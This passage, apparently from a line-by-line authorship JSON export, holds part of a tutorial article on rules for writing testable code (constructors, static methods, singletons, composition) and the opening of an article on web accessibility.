        "content": "*Sources*: [Static Methods are Death to Testability](https://testing.googleblog.com/2008/12/static-methods-are-death-to-testability.html)"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #1: Don\u0027t do Actual Work in Constructors"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "* `new` keyword in a constructor or at field declaration"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "* Code does complex object graph construction inside a constructor rather than using a factory or builder"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "* Anything more than field assignment in constructors"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Any work you do in a constructor needs to successfully navigate through in every test (not just the direct test, but also any related test which tries to instantiate your class indirectly as part of some larger object graph)."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "In short, the constructor\u0027s job is to assign the dependencies to fields. And that\u0027s all."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #2: Don\u0027t Mix Object Construction With Application Logic"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "* Create objects using `new` keyword freely anywhere in your code"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "You should have two kinds of classes in your application."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "First, **[factories](https://en.wikipedia.org/wiki/Factory_(object-oriented_programming))**, where all `new` operators reside in, are in charge of constructing objects, and nothing else."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "The other, **application classes**, are devoid of `new` operators. Instead of creating object, they simply ask for them. This makes it easier to test the application logic by replacing the real classes for test doubles."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Where Have all the \"new\" Operators Gone?](https://testing.googleblog.com/2008/09/where-have-all-new-operators-gone.html) and [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #3: Don\u0027t Mix Service Objects With Value Objects"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "Value objects are your **model** objects, like `User`, `Email`, `CreditCard`."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "1. They are (or should be) very easy to construct. And they should never take a service object in its constructor (since otherwise it is not easy to construct)."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "2. You can freely create value objects with the \"new\" operator directly in line with your business logic (exception to previous rule) since they are leafs of your application graph)."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "3. They are **never mocked**."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "Service objects, on the other hand, are your **logic** objects, like `UserAuthenticator`, `MailServer`, `CreditCardProcessor`. Compared to value objects,"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "1. Service objects are harder to construct. And their constructors ask for lots of other objects for collaboration."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "2. Service objects are harder to construct and as a result are never constructed with a new operator in-line, (instead use factory / DI-framework) for the object graph construction."
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "**Note**: service objects don\u0027t take value objects in their constructors since DI-frameworks tend to be unaware about the how to create a value objects."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "3. Service objects are harder to test since they are all about collaboration and as a result we are forced to use mocking, something which we want to minimize."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "Clearly, they are very different in their nature and usage. Mixing the two creates a hybrid which has no advantages of value-objects and all the baggage of service-object."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "### Rule #4: Avoid Static Methods"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Static methods are procedural code. You can write your program in an OO language only using static methods, with one calling another, then it is not an OOP application but a procedural application. There is *no way* to unit test procedure application because there is no seams for you to divert the normal execution flow."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "You can remove the static methods as below:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "1. If the static method has arguments, chances are you can move the method as an instance method to one of the method\u0027s arguments. (As in `method(a,b)` becomes `a.method(b)`)"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "2. If the static method takes no arguments, either it returns a constant in which case there is nothing to test; or it accesses [global state](#rule-2-avoid-singletons), which is bad."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #5: Favor Composition Over Inheritance"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "At run-time you can not choose a different inheritance, but you can chose a different composition. This is important for tests as we want to test things in isolation."
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "Wrongly used inheritance clutters the focus of test because you need to mock out the your parent classes\u0027 irrelevant dependencies, too. For example,"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "Inheriting from AuthenticatedServlet will make your sub-class very hard to test since every test will have to mock out the authentication. But what if AuthenticatedServlet inherits from DbTransactionServlet? (that gets so much harder)"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Static Methods are Death to Testability](https://testing.googleblog.com/2008/12/static-methods-are-death-to-testability.html) and [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "## Flaw #2: Brittle Global State \u0026 Singleton"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "### Rule #1: Avoid Global States"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "* Adding or using static fields or static methods"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "* Adding or using registries"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "* Using `System.currentTimeMillis()`, `new Date()` or `Math.random()`"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "Global states are a bad idea because they make the code hard to understand and reason about."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Moreover, they cause problems for testing because global states are persistent throughout the lifetime of a JVM instance. In unit testing, we have one JVM instance to run all tests (instead one JVM for one test, for performance reason). Thus the global states are persistent from tests to tests. Now, if some tests expect the global states to be in state A, while some other tests expect the global states to be in state B. In this scenario, you cannot run the tests in parallel, otherwise your tests will become flaky (sometimes pass, sometimes fail) because the order of tests matters."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "### Rule #2: Avoid Singleton Pattern"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "Singleton Pattern, despite being a well-know design patter, are global states in sheep\u0027s clothing. They have **globally** accessible `getInstance()` method and a private singleton object (which is the global state)."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "Another problem about Singleton Pattern is that they are globally accessible, thus any method can access them inside the code without explicitly declaring in its API. In other words, the API lied about its dependency!"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "**Note** singletons (with lowercase s) are valid and sometimes very useful, which you can enforce their singleton identities by enforcing their constructors are called only once in the application. However, Singleton Pattern (with uppercase S) is almost always causing undesirable global states, which you should avoid. Only few examples of Singleton Pattern, including Constants and Logging, are acceptable since they don\u0027t affect the application logic."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Singletons are Pathological Liars](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-join-new-project.html) and [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "## Flaw #3: Dig Into Collaborators"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #1: Don\u0027t Look for Things. Ask for Things."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "* Objects are passed in but never used directly (only used to get access to other objects)"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "* [Law of Demeter](https://en.wikipedia.org/wiki/Law_of_Demeter) violation: method call chain walks an object graph with more than one dot. (e.g. `a.getB().getC().doSomething()`)"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "The Law of Demeter can be summarized as \"only talk to your **immediate** friends\"."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "Previously we mentioned the importance of dependency injection for creating seams in [Flaw #1: no seams for isolating the class under test](#flaw-1-no-seams-for-isolating-the-class-under-test). Here we emphasize on injecting only those **direct dependency**."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s use an example to illustrate why **indirect** dependency hurts testability:"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "Say you have an Authenticator class which needs a `Config` object, do you pass in a path to the configuration file, or just pass in a `Config` object? Since what you need is a `Config` object, not a file path, an example of indirect dependency will be you pass in a path to the configuration file, and read a `Config` object from the path. To test Authenticator, you have to first write some configuration to a file, pass the file path to Authenticator, and let it read a `Config` itself. Versus you can directly create a `Config` object and pass it to Authenticator using direct dependency."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Flaw #4: Class Does Too Much"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "To extreme, it becomes an anti-pattern, [God Object](https://en.wikipedia.org/wiki/God_object)."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #1: Avoid Mixing of Concerns"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs:"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "* summing up what the class does includes the word \"and\""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "* class has fields that are only used in some methods (objects hiding inside)"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "* class has static methods that only operate on parameters (methods should be instance methods of one of the parameters)"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "These classes are hard to test since there are multiple objects hiding inside of them and as a result you are testing all of the objects at once."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "[Single Responsibility Principle](https://en.wikipedia.org/wiki/Single_responsibility_principle) also requires you to have classes with one concern (one reason to change), because these classes are simpler to understand what they are doing and easier to unit test."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Where Have all the \"new\" Operators Gone?](https://testing.googleblog.com/2008/09/where-have-all-new-operators-gone.html) and [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Rule #2: Favor Polymorphism Over Conditionals"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "#### Warning Signs:"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "* Class has the same `switch` or `if` conditions in many places"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "For a detailed code example, please refer to this [Stack Overflow answer](https://stackoverflow.com/a/234491/3522482)."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "From the answer, if you have one switch statement based on an internal field you probably have the same switch in multiple places. This causes problems when you add a new case as you have to update all the switch statements."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "By using polymorphism, you get the same functionality and because a new case is a new class you don\u0027t have to search your code for things that need to be updated. It is all isolated for each class."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "This closely follows with [Open Closed Principle](https://en.wikipedia.org/wiki/Open/closed_principle) because you can ship this abstract parent class (**closed for modification**) as part of your binary library, but people can still extend the functionality by adding new child classes (**open for extension**)."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "*Sources*: [Writing Testable Code](https://testing.googleblog.com/2008/08/by-miko-hevery-so-you-decided-to.html)."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "# Concluding Notes"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "This article includes ten rules that can help you understand some key concepts, such as seams, dependency injection, global states, singletons and Singleton. Also, I hope you can apply these rules into practice, like writing a program with these rules in mind or reviewing some code your wrote before and see whether you can improve its testability, so you can benefit from the things you learn in this article."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 9,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 19,
      "-": 171
    }
  },
  {
    "path": "contents/uix/accessibility.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Accessibility"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Accessibility"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Monika Manuela Hengki](https://github.com/monmanuela)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Rahul Rajesh](https://github.com/rrtheonlyone), [Jacob Li Pengcheng](https://github.com/jacoblipech), [Tan Heng Yeow](https://github.com/tanhengyeow)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is accessibility?](#what-is-accessibility)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why is accessibility important?](#why-is-accessibility-important)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How can I improve the accessibility of my website?](#how-can-i-improve-the-accessibility-of-my-website)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Visual](#visual)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Auditory](#auditory)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Cognitive](#cognitive)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Mobility](#mobility)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Tools for Developers](#tools-for-developers)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Concluding Remarks](#concluding-remarks)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Useful Resources](#useful-resources)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Note that although the scope of this article covers the accessibility of websites, many of the points also apply to accessibility and UI/UX of other softwares too."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Accessibility?"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Accessibility is the practice of making your websites usable by as many people as possible — we traditionally think of this as being about people with disabilities, but really it also benefits other groups such as those using mobile devices, or those with slow network connections. \u003csub\u003e--[MDN Web Docs](https://developer.mozilla.org/en-US/docs/Learn/Accessibility/What_is_accessibility)\u003c/sub\u003e"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why is Accessibility Important?"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "Accessibility is important for users with disabilities to access the Web. There are many kinds of disabilities, including:"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "   * Visual %%e.g., partial blindness, full blindness, color blindness, cataract, glaucoma, etc.%%"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "   * Auditory %%e.g., hard of hearing, deafness, etc.%%"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "   * Cognitive %%e.g., ADHD, autism spectrum, etc.%%"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "   * Mobility %%e.g., quadriplegia, muscular dystrophy, etc.%%"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "At the same time, accessibility also benefits people _without_ disabilities, for example:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "   * Device limitations %%e.g., using mobile phones, smart watches, smart TVs, and other devices with small screens, different input modes, etc.%%"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "   * Age-related limitations %%e.g., poor dexterity, poor eyesight%%"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "   * Temporary limitations %%e.g., broken arm, lost glasses%%"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "   * Situational limitations %%e.g., under bright sunlight, an environment where one cannot listen to audio%%"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "   * Internet-related limitations %%e.g., slow Internet connection, limited bandwidth%%"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "More information on the above can be found on [this article](https://www.w3.org/WAI/fundamentals/accessibility-intro/#what)."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "Improving accessibility also brings some benefits to you as a developer:"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Accessibility is a right**. Caring about accessibility demonstrates good ethics/morals."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "2. **Accessibility helps you improve your website\u0027s UX**. [W3C](https://www.w3.org/standards/webdesign/accessibility) notes that accessibility practices are good design practices in general, which improve the UX of your website."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "3. **Accessibility makes your website more discoverable**. Web pages with good accessibility practices are ranked higher by search engine crawlers, making your website more discoverable and marketable to new users. %%(Read more on accessibility and search engine [here](https://blogs.perficientdigital.com/2018/01/12/website-accessibility-benefit-seo/))%%"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
